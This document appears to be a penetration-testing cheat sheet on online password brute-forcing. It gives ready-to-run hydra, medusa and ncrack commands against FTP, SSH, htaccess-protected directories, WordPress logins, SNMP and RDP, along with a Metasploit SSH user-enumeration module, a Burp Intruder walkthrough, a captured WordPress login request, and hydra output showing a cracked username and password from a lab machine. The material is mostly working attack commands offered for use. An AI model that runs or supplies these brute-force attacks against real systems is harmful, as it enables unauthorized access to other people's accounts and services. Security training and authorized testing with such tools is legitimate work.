# Online Password Cracking

There are several tools specialized for bruteforcing online. There are several different services that are common for bruteforce. For example: VNC, SSH, FTP, SNMP, POP3, HTTP.

> [https://tools.kali.org/password-attacks/hydra](https://tools.kali.org/password-attacks/hydra)

## Port 21 - FTP

```text
hydra -L users.txt -e nsr 192.168.56.102 ftp
# -e nsr try "n" null password, "s" login as pass and/or "r" reversed login
```

## Port 22 - SSH

```text
# Test a users list to find a user
msf > use auxiliary/scanner/ssh/ssh_enumusers

# Hydra
hydra -l root -P wordlist.txt 192.168.0.101 ssh
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V

# Example on kioptrix 3
hydra -e nsr -l loneferret -P /root/Desktop/wordlists/10_million_password_list_top_100000.txt 192.168.1.70 ssh -t 4

# Medusa 
# -e ns for additional password checks ([n] No Password, [s] Password = Username)
# -f Stop scanning host after first valid username/password found
# -M to specify the module to execute ie SSH
medusa -h 192.168.56.103 -U users.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh
```

## Port 80/443 htaccess

You can password protect directories with apache pretty easily. Just configure the htaccess \(I exaplin this in the chapter on Common ports\).

It can then be brute forced like this:

```text
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

### Logins

Use Burp suite.

1. Intecept a login attempt.
2. Right-lick "Send to intruder". Select Sniper if you have nly one field you want to bruteforce. If you for example already know the username. Otherwise select cluster-attack.
3. Select your payload, your wordlist.
4. Click attack.
5. Look for response-length that differs from the rest.

#### Wordpress with hydra

Using BurpSuite, intercept a login attempt:

```text
POST /wp-login.php HTTP/1.1
Host: 192.168.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.2.4/wp-login.php
Cookie: s_cc=true; s_fid=7F27FDE8AFB035AA-13A01347AD602162; s_nr=1550824589386; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

log=user&pwd=pass&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.2.4%2Fwp-admin%2F&testcookie=1
```

We can bruteforce it using hydra:

```text
$ hydra -vV -L wordslist.txt -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

* **-vV** : Verbose
* **-L wordslist.txt** : Try all the usernames from the file wordslist.txt
* **-p wedontcare** : Use an unique password, it doesn’t matter \(we’re only interested in the username for now\)
* **192.168.2.4** : The IP of the machine we’re attacking
* **http-post-form** : What we’re trying to brute force, here a HTTP POST form
* **‘/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username’**
  * **/wp-login.php** : The path to where the form is located
  * **log=^USER^&pwd=^PASS^&wp-submit=Log+In** : The POST parameters to send. ^USER^ and ^PASS^ are placeholders that wiil be replaced with the actual values.
  * **F=Invalid username** : Consider an attempt as a failure \(F\) if the response contains the text _Invalid username_

After a few minutes, we get:

```text
[80][http-post-form] host: 192.168.124.139   login: elliot   password: wedontcare
```

Now we know there is a WordPress user named **elliot**. Let’s try to bruteforce his password using the same technique and word list:

```text
$ hydra -vV -l elliot -P wordslist.txt 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
[...]
[80][http-post-form] host: 192.168.2.4 login: elliot password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
```

## Port 161 - SNMP

```text
hydra -P wordlist.txt -v 102.168.0.101 snmp
```

## Port 3389 - Remote Desktop Protocol

For RDP we can use Ncrack.

```text
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://192.168.0.101
```

